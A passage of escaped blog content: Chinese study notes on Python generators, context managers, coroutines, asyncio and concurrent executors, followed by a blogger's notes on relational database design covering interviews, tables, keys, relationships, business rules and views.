&#x27;ABC&#x27;&gt;&gt;&gt; t = tuple(range(3))&gt;&gt;&gt; list(chain(s, t))[&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, 0, 1, 2]# 上面的写法，用 yield from 重写如下，可减少一层 for 循环&gt;&gt;&gt; def chain(*iterables):... for i in iterables:... yield from i...&gt;&gt;&gt; list(chain(s, t))[&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, 0, 1, 2] 可迭代的归约函数归约函数：接受一个可迭代的对象，返回一个值，例如 reduce 函数； 深入分析 iter 函数iter 函数用于生成迭代器，一般接收一个可迭代对象作为参数；但是它还有个用法是接收两个参数，第一个参数是个可迭代对象，第二个参数是个 predicate，当可迭代对象产生的值满足 predicate 时，就停止产出； 12345678910111213&gt;&gt;&gt; def d6():... return randint(1, 6)...&gt;&gt;&gt; d6_iter = iter(d6, 1)&gt;&gt;&gt; d6_iter&lt;callable_iterator object at 0x00000000029BE6A0&gt;&gt;&gt;&gt; for roll in d6_iter:... print(roll)...4363 生成器很适合用来处理大数据集，这样可以利用有限的内存，处理无限大的数据，例如大型数据库； 生成器当作协程生成器对象有个 send 方法，该方法允许给生成器对象发送消息； 第15章 上下文管理器和 else 块elseelse 不仅可以跟 if 搭配使用，还可以跟 for, while, try 搭配使用；在这些场景中，else 实际上是 then 的意思，表示某个动作如果顺利完成了，那么就执行 else 里面的语句；如果没有顺利完成，就不执行； 12345for item in my_list: if item.flavor == &#x27;banana&#x27;: breakelse: # 如果 for 循环结束，没有触发 break，那么就执行 else；如果触发，就退出循环，不执行else raise ValueError(&#x27;No banana flavor found!&#x27;) 123456try: dangerous_call()except OSError: log(&#x27;OSError...&#x27;)else: # 如果 dangerous_call 顺利执行，没有报异常，则执行 else；如果报异常，就不执行 else after_call() withwith 的目标是安全的实现 try…finally；with 之后的表达式（例如 open 函数）会创建一个上下文管理器对象。该对象有两个方法，分别是 enter 和 exit；with 语句开始执行时，会调用 enter 方法；执行结束后，会调用 exit 方法，类似 finally 的作用； 123456# with...as... 是一个表达式，该表达式的前半段子句，会创建上下文管理器对象，并执行 enter 方法# enter 方法执行完成后，会将结果返回到 fp 变量上，但 as 并不是必须的，有些场景并不需要返回什么东西&gt;&gt;&gt; with open(&#x27;mirror.py&#x27;) as fp: ... src = fp.read(60) # # 当解释器执行完整个 with 块的语句后，会调用 exit 方法，清理现场 1234567891011121314151617# 以下是一个上下文管理器类的示例class LookingGlass: def __enter__(self): # 做准备工作 import sys self.original_write = sys.stdout.write sys.stdout.write = self.reverse_write return &#x27;JABBERWOCKY&#x27; def reverse_write(self, text): # 实际干活的方法 self.original_write(text[::-1]) def __exit__(self, exc_type, exc_value, traceback): # 做清理工作 import sys sys.stdout.write = self.original_write if exc_type is ZeroDivisionError: print(&#x27;Please DO NOT divide by zero!&#x27;) return True contextlib 模块中有一些现成的工作，可用来创建自定义的 context 类（上下文管理器）； @contextmanagercontextmanager 装饰器可以简化上下文管理器的定义 1234567891011121314151617181920import contextlib@contextlib.contextmanager # 该装饰器会将 looking_glass 函数包装成带有 enter 和 exit 方法的类def looking_glass(): import sys original_write = sys.stdout.write def reverse_write(text): original_write(text[::-1]) sys.stdout.write = reverse_write msg = &#x27;&#x27; try: yield &#x27;JABBERWOCKY&#x27; # 这里 yield 起到了类似分隔的作用，enter 执行到这里，后面由 exit 执行 except ZeroDivisionError: msg = &quot;Please DO NOT divide by zero&quot; finally: sys.stdout.write = original_write if msg: print(msg) 个人感觉所谓的上下文管理器，本质上也像是一个实现了约定协议的鸭子类型，只要按照协议实现 enter 和 exit 方法即可； 第16章 协程yield 有两个兽性，一个是生成，一个是退让；这两个意思刚好是协程的描述； 当 yield 放在表达式的左边时，它做为生成器使用； 当 yield 放在表达式的右边时，它做为协程使用，等待传入值； 123456789101112131415&gt;&gt;&gt; def simple_coroutine(): # ➊... print(&#x27;-&gt; coroutine started&#x27;)... x = yield # yield 右边没有值，意味着它生成 None... print(&#x27;-&gt; coroutine received:&#x27;, x)...&gt;&gt;&gt; my_coro = simple_coroutine()&gt;&gt;&gt; my_coro # 生成器已经创建，但是还没有启动，需要通过 next 让它启动&lt;generator object simple_coroutine at 0x100c2be10&gt;&gt;&gt;&gt; next(my_coro) # 通过 next 来启动生成器-&gt; coroutine started&gt;&gt;&gt; my_coro.send(42) # 给 yield 传值，仅当协程处于暂停状态时，才能够给它传值-&gt; coroutine received: 42Traceback (most recent call last): # ➏...StopIteration 协和在 yield 关键字所在的位置暂停执行 使用协程重新设计平均值计算器 12345678910111213141516171819def averager(): total = 0.0 count = 0 average = None while True: # 永远不会停止，可以无限计算平均值 term = yield average # 等待外部传入值，外部每传一次，就计算一次总体平均值 total += term count += 1 average = total/count # 以下是使用示例&gt;&gt;&gt; coro_avg = averager() # 创建&gt;&gt;&gt; next(coro_avg) # 激活&gt;&gt;&gt; coro_avg.send(10) # 传值10.0&gt;&gt;&gt; coro_avg.send(30)20.0&gt;&gt;&gt; coro_avg.send(5)15.0 使用协程时，经常容易忘记要先激活它。为了避免这种错误，可考虑定义一个帮忙激活的装饰器 12345678910from functools import wrapsdef coroutine(func): &quot;&quot;&quot;定义一个装饰器：帮忙预激`func`&quot;&quot;&quot; @wraps(func) def primer(*args,**kwargs): ➊ gen = func(*args,**kwargs) ➋ next(gen) # 激活 return gen ➍ return primer 在调用生成器的 send 函数时，如果给它传递的参数类型有误，会导致它抛出异常，从而终止协程； 生成器有一个 throw 方法可用于触发异常；如果生成器内部有处理异常的代码，则执行；如果没有，则冒泡； 生成器还有一个 close 方法可用于抛出 exit 异常 yield fromyield from 带来了双向通讯机制，貌似可用来实现异步编程；先定义生成器，然后激活它；之后向它发送数据；当数据处理完成后，会触发异常，获得处理结果； 12345678910111213141516171819202122232425262728293031323334353637from collections import namedtupleResult = namedtuple(&#x27;Result&#x27;, &#x27;count average&#x27;)# 子生成器def averager(): total = 0.0 count = 0 average = None while True: term = yield # 感觉此处有点像是一个点位符，等待外部传值进来，或许应该叫 await if term is None: # 当外部传 None 进来时，就中断退出循环 break total += term count += 1 average = total/count return Result(count, average) # 中断循环后，返回计算结果# 委托生成器def grouper(results, key): # 这里为什么要循环？ # 答：为了不断接收外面传进来的值 while True: # 关键字 yield from 默认会让当前函数返回一个生成器，可惜这个关键字很不直观 # send 传进来的值，会通过传入 averager，yield from 有点像管道的作用 results[key] = yield from averager() # 这里的 yield from 很像 await # 客户端（调用方）def main(data): results = &#123;&#125; for key, values in data.items(): group = grouper(results, key) # grouper 返回生成器 next(group) # 预激活 # 激活后，开始进入 while 循环，在 yield from 处暂停 for value in values: group.send(value) # send 将值传给 averager，开始与内部的子生成器通讯 group.send(None) # 传入None，中断子生成器，让委托生成器获得结果 print(results) yield from 跟 await 有一个很大的不同，即 yield from 在将工作做到一半后，将控制权还给调用者，由调用者做剩下的工作； 据说 python 后来引入了 await 第19章 并发模型协程: coroutine，一个可以暂停并重新运行自己的函数； 协程的特点在于可以通过关键字，标识出异步的位置，然后交出控制权，让主程序的其他部分获得控制权；自己则进入队列，等待异步的代码执行完毕；改变自己状态，等待被唤醒，继续运行自己余下部分的代码； 没想到 Python 有一个全局锁（GIL），每次只允许一个线程占有，那这就意味着 python 无法同时利用多核的优势好像，除非起多个进程，就像 js 的 cluster 一样； Python 解释器每隔一定的时间（貌似是 5ms），会释放 GIL，以便其他线程能够获取锁；另外，任意一个函数在调用 syscall 时，它都会释放 GIL； 书里面的 spinner 案例，看起来很奇怪，因为协程的结束，竟然是由调用者的代码发起的，跟 js 好像不太一样；但是 await 貌似是一样的； 后来发现，协程也可以自己结束，不需要外部让它结束；书上的案例只是示范说可以主动干预。但其实正常使用场景是不干预，让它自行运行结束，返回结果； 问：好奇有无可能用装饰器，将非协程的代码，包装成协程代码？答：想了一下，虽然可能，但是由于非协程代码里面，在遇到 I&#x2F;O 任务时，没有使用 await 交出控制权，该协程貌似可能会卡在那里等待； 协程能够起作用，貌似重点在于每次遇到 I&#x2F;O 任务时，要主动交出控制权；在 js 里，很多库都是默认异步编写的，因此不容易忘记这个事情。但是在 python 里面，很多库并非天生异步，例如常用的 requests，此时很有必要提高警惕； 当协程获得控制权，处于运行中的状态时，它是无法被取消的。因为只有一个线程，当它在运行时，意味着想要取消它的代码并没有在运行；仅当协程位于队列中，处于等待状态时，才有可能被取消；此时取消它的代码有可能获得了控制权； asyncio.run() 函数，做为所有协程运行代码的入口； asyncio.create_task()，在当前协程中，创建一个新的协程；可基于返回的 task 对象，对新建的协程进行控制； await coro()，调用 coro，并同步等待它返回结果； 调用 coro() 时，并不意味着 coro 的代码会马上执行，而只是表示将它加入了队列，实际的执行时间取决于事件循环的高度器； 跟 js 一样，await 关键字必须用在 async 定义的函数中；当函数用 async 定义时，它是一个协程；每次对该函数的调用，都是都它加入事件循环的队列中；而 await 表示交给当前协程对 CPU 的使用，即停止运行，让调度器去运行其他协程；等 await 的事件结束时，调度器会重新安排它运行； GIL 的真实影响各种处理网络请示的库，如 requests，在发起请示后，会释放当前线程的 GIL，以便其他线程可以抢占；但如果只有一个线程，那么抢占并没有意义。仅在多线程时，抢占才有意义；而且即使抢占成功，后续 requests 仍然会再次被分配 GIL，但此时它有可能仍然还没有取得响应，因此会浪费掉一些性能；但总的来说，多线程有助于提高 I&#x2F;O 的并发处理能力；但不适用于 CPU 密集型的任务，性能反而变差，因为 CPU 不断在多个线程之间切换，但每次只运行一个线程，最终的性能还不如顺序执行来得快； 另外还有一些库的设计是异步的，但如果当前的代码不是 async 的话，貌似也无法使用 await 来交出控制权？ 当处理计算密集型任务，因为 GIL 的存在，多线程是没有意义的，因为每次只有一个线程在工作；反而不如使用单线程来得简单和高效；如果有多核，则可以考虑使用多进程模式来提高效率； 第20章 Concurrent Executorsconcurrent.futures 库里面，有两个类，分别是 ThreadPoolExecutor 和 ProcessPoolExecutor，它们可以很方便的使用线程或者进程来实现并发； 对使用者来说，背后的线程或进程是透明的，它会自动开启多线程或进程，同时创建任务队列，收集各线程的处理结果； Python 里面的 futures 有点像 js 里面的 promise；但 futures 一般不直接创建，而是交由框架来创建；开发者可以在更高的抽象维度来使用它，这样可以避免错误使用； future.done() 方法可用来查询是否计算完成了，但更常见的做法是不查询，而是等待通知，即完成后，调用回调函数即可； future 有个 add_done_callback 方法，它接受一个回调函数做为参数；注意：该回调函数，将在运行该 future 的线程或进程中直接运行； future.result() 方法可用于获取计算结果；但 concurrency 和 asyncio 两个库对方法的实现有所不同；concurrency 调用 result 方法时，会造成堵塞，等待结果的返回；同时支持 timeout 参数，超时未返回时，会抛出异常；asyncio 则不支持 timeout 方法，但支持 await 关键字，这样不会造成堵塞； concurrency 还有一个 as_completed 方法，专门用来读取 result，以避免堵塞， executor.map() 主要用于一个函数，并发处理多个不同的参数 executor.submit() 则更灵活一些，多个不同的函数，并处理各自不同的参数；最后通过 as_completed 方法收集计算结果； 第21章 异步编程 虽然可以通过 async def 来定义异步函数，但是如果函数体中包含一些非异步的操作，比如将文件写入本地，貌似该同步操作有可能会造成堵塞，占用整个线程，直到写入成功？经查证，发现确实如此，在异步函数中，只要有任意一个 其他海象符 :&#x3D;，为了省写一行代码，先检查，确认有值后，再赋值；没值的话，就不赋值 12345678910111213# 没有海象符的时候name = abc.get(&quot;name&quot;)if name: # doAelse: # doB # 有海象符后if name := abc.get(&quot;name&quot;): # doAelse: # doB","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"自己动手设计数据库","slug":"自己动手设计数据库","date":"2017-07-01T07:45:00.000Z","updated":"2024-09-22T23:08:43.586Z","comments":true,"path":"2017/07/01/自己动手设计数据库/","permalink":"http://example.com/2017/07/01/%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E8%AE%BE%E8%AE%A1%E6%95%B0%E6%8D%AE%E5%BA%93/","excerpt":"","text":"关系数据库 数据库类型：操作型数据库，分析型数据库 数据库模型：层次，网状，关系； 关系数据库的优势 内置多层次的完整性 数据在逻辑和物理上都独立于数据库应用； 确保数据一致性和准确性； 简便的数据检索； 设计目标 数据库设计对于保持数据的一致性，完整性和准确性至关重要； 优秀设计的目标 支持设定和即时的信息检索； 正确且高效地构建表； 数据完整性落实到表，字段，以及关系层次； 数据库支持与业务相关的业务规则； 数据库适应未来的发展； 优秀设计的好处 易于检索； 易于修改和维护； 易于开发和创建应用； 数据库设计方法 需求分析 数据建模 规范化； 术语 数据与信息：后者是前者有意义的展示；存储的是数据，检索的是信息； null：代表一个缺失或未知的值； 表： 每个表代表一个单独的特定主题，可以是一个对象，或者一个事件； 数据表：存储数据以提供信息； 验证表：存储专门用于实现数据完整性的数据；验证表通常用来表示主题 字段 设计得当的数据库中，每个字段有且仅有一个值；设计不当或者差劲的数据库中，则存在复合字段，多值字段，计算字段； 视图 一个虚表，由数据库中的一个或多个表的字段组成； 它只从表中获取数据，并不存储数据，所以叫虚表；Access 称呼它为已保存的查询； 视图的好处：多表，最新，安全，定制，完整 可用于同时处理多个表中的数据； 可用于防止用户查看或操作单个表或一组表中的特定字段； 可用于实现数据完整性（验证视图） 键 主键：每个表都必须有一个主键； 外键：另外一个表的主键，在当前表中称为外键（在一对一的表中，二者合二为一） 关系 一对一 一对多：最为常见的一种关系，有助于消除重复数据，把冗余数据保持在最低水平； 多对多：通过联系表，将两张表联系起来； 参与的类型 可选 强制 参与度：可用于实现业务规则的限制； 字段说明 一般元素：字段名称，字段描述 物理元素：数据类型，长度，显示格式； 逻辑元素：必需值，值范围，默认值； 数据完整性 有效性，一致性，准确性； 表层次完整性； 字段级完整性； 关系层次完整性； 业务规则； 概念性概述 完成设计过程的重要性：唯有贯彻执行完整的设计过程，才能保证数据库结构健全，数据完整； 设计阶段 明确宗旨和任务目标； 宗旨表明了数据库的目标，用于确定数据库的用途； 任务目标是用户可以对数据库的数据执行的常规任务； 分析现有数据库 观察： 如何收集数据 如何展示数据 如何使用数据：普通用户，管理人员； 编辑一个初始字段列表，移出所有计算的字段并放进单独的列表中（未来在视图中实现）； 将初始字段列表发给用户和管理人员手中，进行简单审核，并提出可能的修改意见，鼓励其反馈信息； 创建数据结构 根据前两个阶段的成果，确定表将表示的各个主题，然后为这些主题创建表，并将其与字段列表相匹配，确保每个表只表示一个主题且不包含重复的字段； 审核表中的每个字段，提炼表中的复合字段和多值字段，确保它们分别只包含单一值，并将与该表主题不相符的字段剔除； 为每个表创建合适的键，确保每个表都拥有正确定义的主键，唯一标识表中的每条记录； 为每字段创建字段说明，可以开展用户访谈，了解他们看重的字段特征，审核和讨论他们不熟悉的特征； 编写字段说明，完成后，再与用户和管理人员过一次审核，并适当做出改进； 确定和建立表关系 用户访谈，发现关系，确定关系特征，建立关系（一对一，一对多，多对多）； 使用主键或关联表建立每种关系中表之间的逻辑联系； 确定每种关系中表的参与类型与参与度； 确定和定义业务规则 开展访谈，确定数据库各方面的限制，建立业务规则； 定义和实现验证表，以支持某些业务规则； 业务规则的定义是一个持续、重复的动态过程； 确定和定义视图 开展访谈，确定数据库的使用方式，建立视图（视图更直接的反映数据库的使用方式，表则相对来说更加抽象一些，颗粒度更小）； 通过了解用户使用数据库的方式，确定需要建立的视图类型（有几种类型？3种，数据，聚合，验证）（每个用户以各自不同的方式来访问信息，可以通过视图来解决这些问题） 使用适当的表和字段，定义访谈过程中确定下来的视图，并根据特定的信息检索需求，为这些视图建立标准； 审核数据完整性 审核每个表，检查每个表中的字段，确保结构合理，表层次的完整性； 审核每个字段的字段说明，确保字段级的完整性； 审核每种关系的有效性，确认关系类型，以及确定关系中每个表的参与特征，确保共享字段之间存在匹配值，以及关系中两表之间不存在插入，更新或删除数据的问题； 审核业务规则，确认数据库各方面的限制； 明确宗旨和任务目标 第一步，确定和表明数据库的目标，定义用户可以执行的任务清单； 开展访谈 参与者指南 让参与者知道你的意图 让参与者知道你感谢他的参与 如果发生争议，确保每个人知道你是正式仲裁人；（如果是与数据库无关的问题，则应咨询相关的权威人士） 采访者指南 让人放松的访谈环境，比如光线明亮的房间，舒适的沙发； 限制访谈人数（个人在集体中的表现会有所不同，并更多受到他人的影响） 对用户和管理人员分开访谈； 如果必须对多组人员进行访谈，为每个小组安排一个组长； 在访谈之前准备好问题（开放式问题） 如果不擅长笔记，可以使用录音或录像的方式进行辅助； 给予每个人同等的关注（信息的来源越多，越能够看清楚全貌） 保持访谈的节奏，控制好时间和主题； 明确宗旨 避免出现直接表述任务的语句； 简明扼要，目标具体； 常用问题 如何向新客户介绍企业的目标？ 你认为企业的目标是什么？ 企业的主要作用是什么？ 你如何描述企业的作用？ 你如何阐述企业存在的最重要原因呢？ 企业的主要着眼点是什么？ 明确的任务目标 一个陈述句，语言简练，切中要点，准确明白；（有点类似于业务用例） 每个任务目标只包含一个任务，简单明确； 常见问题 你平常都做一些什么？ 你如何定义自己的工作描述？ 你使用什么类型的数据呢？ 你开出的报表是什么类型的呢？ 你记录什么类型的事件呢? 你的机构提供什么类型的服务呢? 你如何描述自己的工作？ 分析现有的数据库 了解现有数据库，目标： 判断数据库是否满足当前机构的信息要求； 发现现有结构的缺陷； 决定数据库该如何设计，才能满足机构未来的信息要求； 需要回答以下问题 机构使用的是哪些类型的数据？ 纸质数据库 遗留数据库：如果无人真正了解遗留数据库的结构，将每个数据库中的数据打印出来会非常有用； 人类知识库：存放在大脑中的经验和数据； 机构如何使用这些数据？ 机构如何管理和维护这些数据？ 开展分析 三个步骤： 审核数据收集方式； 复查信息呈现方式； 开展用户和管理人员访谈； 了解如何收集数据 审核所有纸质文档； 评审机构收集数据使用的所有计算机程序； 例如文字处理软件，电子数据表格等； 截屏软件进行截屏，放入WORD，标注源程序的名称，截屏日期，打印出文档；重复此步骤，收集完整，放入特定文件夹，以备后用； 检查机构通过互联网收集数据所用的网页（处理方法同第二点） 了解如何呈现信息 常见的三种呈现方法：报表，幻灯片，网页； 步骤 识别和评估机构的数据库生成的每份报表，不论是手写报表还是应用程序生成的报表； 审核使用或包含数据库中数据的幻灯片； 评审直接从数据库提取信息的网页； 开展访谈 访谈目的 为之前收集的样本提供细节信息； 了解机构使用数据的方式； 有助于定义初始字段和表结构，以及定义未来的信息要求； 基本访谈技巧 访谈过程 使用开放式问题，聚焦具体主题；封闭式问题适合聚焦某一具体的细节； 从开放式问题开始，为讨论确立若干一般主题； 注意让对方处于放松的状态；如果回答简短，表示其紧张拘束，可考虑选择一些不相关的话题，或者其更为熟悉和轻松的话题来作为开场； 确定主题 提出开放式问题，确定回答中暗含的主题： 可以通过从回答的句子中寻找名词来确定主题； 找到名称，写下来，形成主题列表； 确定特征 找到主题后，提出与之相关的后续问题，尽量获取该主题相关的更多细节； 寻找表示该主题特征的名词，通过与主题带有从属关系； 在另外的纸张上记下特征列表； 用户访谈 围绕四个问题展开 用户当前使用的数据类型； 用户当前如何使用数据； 评审收集的数据样本； 用户日常工作中要求的信息类型； 评审数据类型和用途：确定用户当前使用的数据类型以及如何使用这些数据支持工作； 评审样本：为每个样本提供描述，说明该样本的目的和用途； 评审信息要求 当前信息要求 评审报表样本是一个开户讨论的好方式； 判断数据源，确定该用户使用的所有数据，直接的，间接的； 附加信息要求 询问用户是否希望在报表中看到其他信息，让其在报表中写下来，并注明原因； 确定附件信息中是否有新主题或新特征； 未来信息要求 了解参与者眼中的机构未来发展所必需的信息； 可以通过呈现草图或原型图，让用户对这个问题更加有概念； 管理人员访谈 集中在以下四个问题 管理人员当前接收到的信息类型 管理人员需要的附加信息类型 管理人员预计未来所需的信息类型 管理人员对机构总体信息要求的认识 评审当前信息要求 了解管理人员的工作及与之对应的职责，一方面可以帮助对方集中注意力，一方面可以可以了解到他如何使用信息，以及他对信息的看法； 确认是否使用收集到的报表样本；如无，略过；如有，确认有无疏漏，如有，进行补充；若发现新主题和特征，添加到列表中； 确认是否收到不在样本中的报表，如有，收集新报表的样本，并重复第二步的评审； 评审附加信息要求 了解是否需要当前报表缺失的附加信息； 如有，进行补充并注明原因； 增加新主题和特征； 评审未来信息要求 让参与者先思考一下机构当前发展方向，然后向他们了解机构发展对他们决策所需信息的影响； 简要记下参与者想到的新报表； 添加到主题和特征列表中； 评审总体信息要求 目标：寻找用户访谈和管理人员访谈中未讨论到的，机构需要维护的数据； 让参与者评审所有收集到的报表，再询问是否存在其他对机构有价值的信息尚未被挖掘出来； 如有，添加到主题和特征列表中； 编辑完整字段列表 初始字段列表 评审和精简特征列表 精简名称相同的项； 精简表示相同特征的项； 确保项与特征正确对应； 确认样本中是否有新的特征 检查分析所有收集到的样本，确认样本中是否有新特征应该添加到初始字段列表中； 附注：值列表 记录下每个包含值列表的特征名称，这个列表可以为相应特征指定可接受的值范围，它一般强制实行给定的业务规则； 记录下特征中的值；如果值很多，则对值的类型进行简单描述；如有可能，介绍最大值和最小值 计算字段列表 初始字段列表完成后，清除其中的所有计算字段，将它们存入单独的列表； 与用户和管理人员评审列表 开展简单访谈，目标是确定两个列表是否有疏漏； 如有，添加新字段到列表中； 切勿过早认为这些列表已经非常完善； 建立表结构 定义初始表列表 评审初始字段列表，确定隐含主题：让字段说话，浮现主题，再与主题列表进行交叉验证，同时也可以减少人为的成见； 使用主题列表 消除重复项 消除表示相同主题的项 合并主题列表和初始字段列表中的项 使用任务目标 检验前两个步骤中是否遗漏主题 定义最终列表 表类型 数据表 联系表 子集表 验证表 表描述 对表的主题的明确定义，以及该主题重要性的描述； 改进表名称 表名称应该独特且有意义 表名称应该明白无误的展现主题 表名称应该尽量精简 避免使用描述物理特征的词，例如：文件，记录等词 避免使用缩略语； 避免使用专有名称或其他过多限制输入数据的词，例如西南地区员工 避免使用隐含或显式指明多个主题的名称，谨记每个表仅代表一个主题； 使用复数形式 指明表类型 数据，联系，子集，验证 编辑表描述 描述必须对表进行准确的定义，并且阐明其对企业的重要性 指南 对表进行准确的定义； 解释该表对企业的重要性； 描述务求简明扼要； 避免提及操作信息，比如该表使用的方式和适用场合； 不同表描述之间保持独立； 避免使用示例； 用户和管理人员访谈 开展用户和管理人员访谈，获取他们对于表描述的意见 字段对应入表 判断字段和表主题是否相符，再相应的添加到表中； 这个过程切勿使用计算机，使用纸和笔即可； 精简字段 改进字段名称 字段名称应该独特且富有内涵； 字段名称应该简明扼要，准确描述字段所代表的特征； 字段名称务求精简； 切勿使用缩略语，慎用缩写词； 切勿使用混淆字段名称含义的词语，例如“数字识别码号码” 避免使用隐含或显示多个特征的名称； 使用名称的单数形式； 使用理想字段解决异常现象 判断字段是否具备理想字段的要素 要素 代表表主题的鲜明特征 仅包含一个值； 无法分解为更小的元素； 不含计算值或串联值； 在整个数据库结构中独一无二； 主要特征始终保持不变； 将数据模拟填写入表，可以暴露出隐藏的问题，对照理想要素，找出它们； 消除复合字段 确认字段值中的不同元素，再将每个元素单独作为一个字段； 消除多值字段 将该字段从表中剔除，以之作为基础创建一个新的表； 从原表中采用一个字段，建立起原表与新表的联系； 为新表制定名称，类型，描述，并添加到表列表中； 精简表结构 重复字段 只允许出现在一个场合：联系表；其他场合下出现的重复字段，都是不合理的； 参照理想表精简结构 要素 表示单个主题，可以是一个对象或事件； 拥有一个主键 不含复合字段或多值字段； 不含计算字段； 不含无用的重复字段； 冗余数据保持在最低水平； 对于想在一个表中保存另外一个表中的信息的场景，应该使用视图这种虚拟表的方式来解决； 建立子集表 如果一个表中的记录出现多个空白值，那很可能它是由不同类型的物品或事件组成的，这时候可以考虑通过建立子集表来解决这个问题； 精简子集表 消除子集表所有相同的字段，并使用这些字段建立新的数据表； 确认新数据表的主题，然后为其制定合适的名称； 确保子集表表示该数据表的从属主题 为数据表编写合适的描述，然后将它添加到最终表列表中；标明表类型为数据； 键 键对于表结构的重要性： 确保准确识别表中的每条记录； 有助于建立并实施各种完整性：确保表与表之间的匹配始终有值； 用于建立表关系； 键的类型 候选键：可唯一识别表主题的一个字例（即一条记录）的一个或一组字段，每张表必须包含至少一个候选键； 候选键要素（选择指南）： 不得为复合字段 必须包含唯一值； 不得包含 null 值； 其值不得违反机构安全或隐私规则（例如密码、社会保险号等）； 其值无论部分或者整体都不是可选值； 包含定义唯一性所需的最少字段； 其值必须是识别表中每条记录的唯一和独特的识别方式（可避免重复记录）； 其值必须是给定记录中每个字段的唯一识别方式； 除非特殊情况，否则不得修改其值； 通过向表中添加样本数据，有助于准确识别出候选键； 人造候选键：当判断一个表不含候选键时，可以创建和使用人造或代理候选键； 主键 主键字段是整个数据库结构中识别其所属表的唯一方式；主键值是可识别表中特定记录的唯一方式； 主键选择指南 当单字段候选键和复合候选键同时存在时，优先选择单字段； 优先选择名称中包含部分表名称的候选键； 创建主键的规则 每个表有且仅有一个主键； 数据库中的每个表必须是唯一的，即任意两个表不得有相同的主键，除非其中一个是子集表； 替换键：未被挑选为主键的候选键，即是替换键，据说在数据库实施阶段会有很大的作用； 非键：不是候选键，不是主键，即为非键； 表层次完整性 表中无重复的记录 主键为表中每个记录的唯一识别方式； 每个主键值是唯一的； 主键值不为 null ； 评审初始表结构 确保合适主题在数据库中被表达； 确保表名称和表描述规范且准确易懂； 确保字段名称规范且准确易懂：有可能是用户平时习惯的名称不同，可在实施阶段通过标签来替换； 核实已确定到表中的所有字段：确保所有与表主题相符的必要特征到位； 字段说明 字段说明的重要性 有助于建立字段级的完整性； 有助于提升整体数据的完整性； 定义字段说明能够对数据的性质和用途有更清晰的认识； 字段说明构成数据库的“数据字典”；（可作为创建字段和设置字段的指南，也有助于程序在界面上判断需要执行哪些数据输入和验证） 字段说明的三个元素 一般元素： 字段名称，父表，标签，说明类型（独特，通用，可复制），源说明（仅用于可复制类型），共享（联系表），别名，描述 编写字段描述的指南 准确描述该字段，阐明其用途； 陈述简明扼要； 避免重申或改述使用字段名称； 避免使用专业术语，缩略语和缩写； 切勿包含具体实施信息； 不得依赖于另一字段的描述； 切勿使用示例； 物理元素 数据类型 完整版：字符，国际字符，二进制，精确数字，近似数字，布尔值，日期和时间，间隔； 简单版：字母数字，数字，日期和时间； 长度，小数位，字符支持，输入掩码，显示格式 逻辑元素 键类型，键结构，单值性，null 支持，值的输入者，要求值，默认值，值的范围 值的范围 一般：这一字段的所有可能值的完整集合； 视完整性而定：基于该字段在表关系中作用的值的集合； 视业务而定：根据特定业务产生的值的集合； 注意：应避免将“其他”和“杂项”设置在任何的值范围中（原因：毫无意义） 编辑规则：立即输入可编辑，立即输入不可编辑，随后输入可编辑，随后输入不可编辑； 允许的比较，允许的运算：避免出无意义的比较和运算 定义每个字段的字段说明 流程 尽量定义更多更完整的说明 组织会议 介绍字段说明中的各个元素； 评审已定义的说明 解决无法定义或完成的字段； 表关系 关系为何重要 对于存在逻辑关系的两张表，可在两表之间建立连接； 可以减少冗余数据，优化表结构； 可在多张表中提取需要的数据； 关系的类型 一对一 一对多 多对多 自联结关系：同样存在一对一，一对多，多对多关系（大零部件由小零部件组成） 识别现有有关系 建立表的矩阵 提问 关联型问题： 情境型问题 面向归属的问题：拥有，属于，包含 面向动作的问题：制作，访问，放置，教授，参加之类的动词； 建立关系 一对一和一对多：通过主键和外键来建立连接； 多对多：通过联系表来建立连接； 自联结（自引用）：做相同处理； 评审表结构，标准如下： 表示单一主题，物体或事件； 拥有一个主键 不得包含复合字段或多值字段； 不得包含计算字段 不得包含无用的重复字段； 包含的冗余数据仅为最低水平； 改进所有外键 外键的要素 与被复制的主键名称相同 使用被复制的主键的字段说明副本； 建立关系特征 定义删除规则 否定：不允许删除，只允许停用； 限制：先删除所有相关后，才允许删除 级联：自动删除两边的所有 作废：允许删除，并设置其他记录为 null 默认：允许删除，并设置其他记录为默认值； 识别表的参与类型 强制：向相关表输入记录前，该表必须至少存在一个记录 随意：无要求； 识别表的参与度 （最小数量，最大数量） 与用户和管理人员验证表关系； 关系层次的完整性 关系中的两表之间的连接合理健全：合适的主外键或联系表； 以一种有意义的方式向每个表中插入记录：适宜的参与类型； 删除现有记录，不会带来任何不利影响：合适的删除规则； 合理限制关系中相关记录的数量：合适的参与度； 业务规则 什么是业务规则 对数据库特定方面实施的某种限制； 业务规则类型 面向数据库 面向应用程序 二者的区别在于建立的地点和方式，前者可以在数据库的逻辑设计中实现，后者则需要在数据库的物理设计或数据库应用程度中实现； 业务规则的分类 字段业务规则 表关系业务规则 定义和建立业务规则 与用户和管理人员合作 定义和建立字段特有业务规则 选取一个表 评审每个字段，看是否需要加限制 为字段定义必要的业务规则 修改字段相应的说明元素，建立规则； 选定测试该规则的操作：插入，删除，更新 将规则记录在业务规则规范表中； 定义和建立关系特有业务规则 选取一个关系 评审该关系，看是否需要加限制； 为该关系定义必要的业务规则； 修改相应的关系特征，建立规则 选定测试该规则的操作 将规则记录在业务规则规范表中； 验证表 用途：存储专门用于验证数据完整性的数据； 可以通过验证表支持业务规则，例如设置值的范围； 视图 视图：由数据库中一个或多个表组成的虚拟表（本自不存储数据），也可以有取自其他视图的字段； 有些类型的数据库会提供索引视图，即将视图物理化，可以提高访问性能，此时视图会存储数据； 视图的好处： 可以同时从多表中提取数据； 数据总是最新的； 可以定制化访问； 可以提高安全性； 可以促进数据完整性； 视图的类型 数据视图 聚合视图：一组数据聚合后产生的信息（特别适用于统计类型的报表）；聚合视图不支持数据的修改，只能查询； 验证视图：功能同验证表，区别在于可以从多表中读取数据来生成； 视图的可以访问，也可以修改数据，修改的数据会反馈传递到基表中，不管单表还是多表视图，均是如此； 确立视图的过程 与用户和管理人员合作（目的是尽量发掘出已有的或潜在的视图需求） 回顾之前的记录，讨论特定的主题，例如围绕任务目标； 回顾早期收集的数据录入，报表和演示样本； 检查表与及其所表示的主题； 分析表关系； 研究业务规则； 定义视图 酌情使用计算字段 运用条件过滤数据； 